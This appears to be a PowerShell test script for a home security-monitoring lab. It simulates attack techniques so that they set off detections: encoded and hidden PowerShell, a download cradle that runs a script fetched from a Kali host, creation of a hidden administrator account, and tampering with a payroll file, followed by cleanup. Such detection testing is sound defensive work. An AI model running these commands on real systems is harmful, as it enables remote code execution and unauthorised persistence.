param(
    [Parameter(Mandatory = $true)]
    [ValidateSet("encoded-powershell", "bypass-hidden", "download-cradle", "new-admin", "fim", "cleanup")]
    [string]$Test,
    [string]$KaliIp = "192.168.56.40"
)

switch ($Test) {
    "encoded-powershell" {
        $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Output 'mini-soc-lab-test'"))
        powershell.exe -NoProfile -EncodedCommand $encoded
    }
    "bypass-hidden" {
        powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Write-Output 'mini-soc-lab-test' | Out-File C:\SOC-Setup\bypass-test.txt"
    }
    "download-cradle" {
        powershell.exe -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://$KaliIp`:8000/hello.ps1')"
    }
    "new-admin" {
        net user soc_test "LabP@ssw0rd!2026" /add
        net localgroup Administrators soc_test /add
    }
    "fim" {
        Add-Content -Path "C:\Sensitive\payroll.csv" -Value "mallory,99999"
    }
    "cleanup" {
        net localgroup Administrators soc_test /delete 2>$null
        net user soc_test /delete 2>$null
        Set-Content -Path "C:\Sensitive\payroll.csv" -Value "employee,salary`r`nalice,12000`r`nbob,11000"
    }
}
